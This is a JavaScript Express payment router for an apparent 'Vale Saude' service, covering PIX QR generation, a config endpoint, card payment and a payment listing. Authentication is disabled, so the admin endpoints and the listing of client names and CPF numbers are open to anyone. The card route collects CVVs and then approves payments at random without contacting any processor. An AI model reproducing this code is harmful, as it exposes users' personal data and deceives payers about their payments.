const express = require('express');
const { v4: uuidv4 } = require('uuid');
const crypto = require('crypto');
const { get, run, all } = require('../database');
// (auth desabilitada)

const router = express.Router();

// ========== PIX BR Code Generator ==========
function generatePixPayload(pixKey, merchantName, merchantCity, amount, txid) {
  const format = (id, value) => {
    const len = String(value.length).padStart(2, '0');
    return `${id}${len}${value}`;
  };

  const payloadFormatIndicator = '000201';
  const gui = '0014BR.GOV.BCB.PIX';
  const pixKeyField = format('01', pixKey);
  const merchantAccountInfo = format('26', gui + pixKeyField);
  const merchantCategoryCode = '52040000';
  const transactionCurrency = '5303986';
  const transactionAmount = amount > 0 ? format('54', amount.toFixed(2)) : '';
  const countryCode = '5802BR';
  const merchantNameField = format('59', merchantName.slice(0, 25));
  const merchantCityField = format('60', merchantCity.slice(0, 15));
  const txidField = format('05', (txid || uuidv4().replace(/-/g, '').slice(0, 25)));
  const additionalData = format('62', txidField);
  const crcPlaceholder = '6304';

  const payload = payloadFormatIndicator + merchantAccountInfo + merchantCategoryCode
    + transactionCurrency + transactionAmount + countryCode
    + merchantNameField + merchantCityField + additionalData + crcPlaceholder;

  // CRC16-CCITT
  let crc = 0xFFFF;
  for (let i = 0; i < payload.length; i++) {
    crc ^= payload.charCodeAt(i) << 8;
    for (let j = 0; j < 8; j++) {
      if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
      else crc <<= 1;
    }
  }
  crc = (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
  return payload + crc;
}

// Public: Get payment config
router.get('/config', (req, res) => {
  try {
    const rows = all('SELECT * FROM settings');
    const obj = {};
    rows.forEach(s => { obj[s.key] = s.value; });

    let methods = ['pix', 'card', 'boleto'];
    try { if (obj.payment_methods) methods = JSON.parse(obj.payment_methods); } catch {}

    var popup = {};
    try { if (obj.popup_config) popup = JSON.parse(obj.popup_config); } catch {}
    popup.enabled = popup.enabled !== false;

    res.json({
      pix_key: obj.pix_key || '',
      pix_merchant_name: obj.pix_merchant_name || '',
      pix_merchant_city: obj.pix_merchant_city || '',
      pushinpay_url: methods.includes('pushinpay') ? (obj.pushinpay_url || '') : '',
      pushinpay_url_virtual: methods.includes('pushinpay') ? (obj.pushinpay_url_virtual || obj.pushinpay_url || '') : '',
      pushinpay_url_fisico: methods.includes('pushinpay') ? (obj.pushinpay_url_fisico || obj.pushinpay_url || '') : '',
      payment_methods: methods,
      popup: popup,
      apk_url: obj.apk_url || '',
      footer_phone: obj.footer_phone || '',
      footer_email: obj.footer_email || '',
      footer_cnpj: obj.footer_cnpj || '',
      whatsapp: obj.whatsapp || ''
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Public: Generate PIX payment
router.post('/generate-pix', (req, res) => {
  try {
    const { request_id, client_id, valor } = req.body;
    if (!client_id) return res.status(400).json({ error: 'client_id é obrigatório' });

    const settings = all('SELECT * FROM settings');
    const s = {};
    settings.forEach(r => { s[r.key] = r.value; });

    const pixKey = s.pix_key || '00000000000';
    const merchantName = s.pix_merchant_name || 'Vale Saude';
    const merchantCity = s.pix_merchant_city || 'Sao Paulo';

    const amount = parseFloat(valor) || 4.99;
    const txid = uuidv4().replace(/-/g, '').slice(0, 25);

    const pixPayload = generatePixPayload(pixKey, merchantName, merchantCity, amount, txid);
    const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(pixPayload)}`;

    const paymentId = uuidv4();
    run(`INSERT INTO payments (id, request_id, client_id, metodo, valor, status, pix_qr_code, pix_chave) VALUES (?, ?, ?, 'pix', ?, 'pendente', ?, ?)`,
      [paymentId, request_id || '', client_id, amount, qrCodeUrl, pixPayload]);

    res.json({
      paymentId,
      valor: amount,
      pixQrCode: qrCodeUrl,
      pixCopiaCola: pixPayload,
      expiresAt: new Date(Date.now() + 15 * 60 * 1000).toISOString()
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Public: Create card payment
router.post('/card', (req, res) => {
  try {
    const { request_id, client_id, card_numero, card_nome, card_validade, card_cvv, parcelas } = req.body;
    if (!request_id || !client_id || !card_numero || !card_nome || !card_validade || !card_cvv) {
      return res.status(400).json({ error: 'Todos os campos do cartão são obrigatórios' });
    }

    const request = get('SELECT * FROM requests WHERE id = ?', [request_id]);
    if (!request) return res.status(404).json({ error: 'Solicitação não encontrada' });

    const lastFour = card_numero.replace(/\s/g, '').slice(-4);
    const id = uuidv4();
    const paid = Math.random() > 0.1;

    run(`INSERT INTO payments (id, request_id, client_id, metodo, valor, status, card_last_four, parcelas, paid_at) VALUES (?, ?, ?, 'cartao', ?, ?, ?, ?, ?)`,
      [id, request_id, client_id, request.valor_total, paid ? 'pago' : 'falha', lastFour, parcelas || 1, paid ? new Date().toISOString() : null]);

    if (paid) {
      run('UPDATE requests SET status = "pago", updated_at = datetime("now") WHERE id = ?', [request_id]);
      run('UPDATE clients SET status = "ativado", updated_at = datetime("now") WHERE id = ?', [client_id]);
    }

    res.status(201).json({
      paymentId: id,
      status: paid ? 'pago' : 'falha',
      message: paid ? 'Pagamento confirmado' : 'Pagamento não processado'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: Generate PIX code (no save, just generate payload)
router.post('/generate-pix-code', (req, res) => {
  try {
    const { pix_key, merchant_name, merchant_city, amount } = req.body;
    if (!pix_key) return res.status(400).json({ error: 'pix_key é obrigatório' });

    const settings = all('SELECT * FROM settings');
    const s = {};
    settings.forEach(r => { s[r.key] = r.value; });

    const mName = merchant_name || s.pix_merchant_name || 'Vale Saude';
    const mCity = merchant_city || s.pix_merchant_city || 'Sao Paulo';
    const valor = amount || 4.99;
    const txid = uuidv4().replace(/-/g, '').slice(0, 25);

    const pixPayload = generatePixPayload(pix_key, mName, mCity, valor, txid);
    const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(pixPayload)}`;

    res.json({
      pixQrCode: qrCodeUrl,
      pixCopiaCola: pixPayload,
      expiresAt: new Date(Date.now() + 15 * 60 * 1000).toISOString()
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Public: Check payment status
router.get('/:id/status', (req, res) => {
  try {
    const payment = get('SELECT id, status, metodo, valor, paid_at FROM payments WHERE id = ?', [req.params.id]);
    if (!payment) return res.status(404).json({ error: 'Pagamento não encontrado' });
    res.json(payment);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.get('/', (req, res) => {
  try {
    const { status, page = 1, limit = 50 } = req.query;
    const offset = (page - 1) * limit;

    let where = [];
    let params = [];
    if (status) { where.push('p.status = ?'); params.push(status); }
    const whereClause = where.length ? ' WHERE ' + where.join(' AND ') : '';

    const total = get(`SELECT COUNT(*) as total FROM payments p${whereClause}`, params).total;
    params.push(Number(limit), Number(offset));

    const payments = all(`SELECT p.*, c.nome as client_nome, c.cpf as client_cpf
      FROM payments p JOIN clients c ON p.client_id = c.id${whereClause}
      ORDER BY p.created_at DESC LIMIT ? OFFSET ?`, params);

    res.json({ payments, total, page: Number(page), pages: Math.ceil(total / limit) });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
